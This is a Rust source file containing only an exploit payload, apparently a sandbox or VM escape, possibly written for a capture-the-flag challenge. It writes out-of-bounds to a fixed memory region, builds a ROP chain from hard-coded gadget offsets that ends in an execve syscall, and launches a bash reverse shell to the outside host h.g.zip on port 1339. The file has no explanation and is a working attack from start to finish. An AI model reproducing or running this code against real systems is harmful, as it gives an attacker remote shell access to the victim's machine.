#[no_mangle]
pub unsafe extern "C" fn entrypoint(input: *mut u8) -> u64 {
    const SZ: isize = 256*1024 + (3 * 16 + 6) * 8;

    let offset: u64 = 0x1a9121ac;

    const BASE: *mut u8 = 0x300000000 as *mut u8;

    let binsh = "/bin/bash\x00";

    for i in 0..binsh.len() {
        std::ptr::write(BASE.offset(SZ - 54 * 8 - 0x40 + i as isize), binsh.as_bytes()[i]);
    }

    let args = "-c\x00/bin/bash -i >& /dev/tcp/h.g.zip/1339 0>&1\x00";

    for i in 0..args.len() {
        std::ptr::write(BASE.offset(SZ - 54 * 8 - 0x30 + i as isize), args.as_bytes()[i]);
    }

    let stk = (BASE.offset(SZ + 10 * 8) as *mut u64).read() - 0x2c0;
    let base = std::ptr::read(BASE.offset(SZ + 11 * 8) as *mut u64) - offset;

    std::ptr::write(BASE.offset(SZ - 54 * 8 - 0x60 + 0) as *mut u64, stk - 0x40);
    std::ptr::write(BASE.offset(SZ - 54 * 8 - 0x60 + 8) as *mut u64, stk - 0x30);
    std::ptr::write(BASE.offset(SZ - 54 * 8 - 0x60 + 16) as *mut u64, stk - 0x30 + 3);

    let prdi = base + 0x1bd3a546;
    let prsi = base + 0x2657529e;
    let prdx = base + 0x16290fb2;
    let prax = base + 0x212c547e;
    let sys = base + 0x31fa1f47;

    let mut idx = 0;

    std::ptr::write(BASE.offset(SZ + 11 * 8 + idx * 8) as *mut u64, prdi);
    idx += 1;
    std::ptr::write(BASE.offset(SZ + 11 * 8 + idx * 8) as *mut u64, stk - 0x40);
    idx += 1;

    std::ptr::write(BASE.offset(SZ + 11 * 8 + idx * 8) as *mut u64, prsi);
    idx += 1;
    std::ptr::write(BASE.offset(SZ + 11 * 8 + idx * 8) as *mut u64, stk - 0x60);
    idx += 1;

    std::ptr::write(BASE.offset(SZ + 11 * 8 + idx * 8) as *mut u64, prdx);
    idx += 1;
    std::ptr::write(BASE.offset(SZ + 11 * 8 + idx * 8) as *mut u64, 0);
    idx += 1;

    std::ptr::write(BASE.offset(SZ + 11 * 8 + idx * 8) as *mut u64, prax);
    idx += 1;
    std::ptr::write(BASE.offset(SZ + 11 * 8 + idx * 8) as *mut u64, 59);
    idx += 1;

    //std::ptr::write(BASE.offset(SZ + 11 * 8 + idx * 8) as *mut u64, 0x1337);
    //idx += 1;

    std::ptr::write(BASE.offset(SZ + 11 * 8 + idx * 8) as *mut u64, sys);
    idx += 1;

    std::ptr::write(BASE.offset(SZ + 11 * 8 + idx * 8) as *mut u64, 0x1337);
    idx += 1;



    0
}
